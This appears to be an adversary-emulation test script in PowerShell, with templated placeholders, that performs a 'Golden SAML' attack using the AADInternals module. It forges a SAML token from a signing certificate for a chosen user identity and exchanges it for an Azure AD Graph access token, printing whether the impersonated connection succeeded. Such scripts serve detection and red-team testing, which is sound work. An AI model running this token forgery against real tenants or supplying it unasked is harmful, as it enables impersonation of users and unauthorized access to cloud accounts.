Import-Module AADInternals -Force
$saml = New-AADIntSAMLToken -ImmutableID "#{immutable_id}" -PfxFileName "#{certificate_path}" -Issuer "#{issuer_uri}"
$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache
if ($conn) { Write-Host "`nSuccessfully connected as $($conn.User)" } else { Write-Host "`nThe connection failed" }
Write-Host "End of Golden SAML"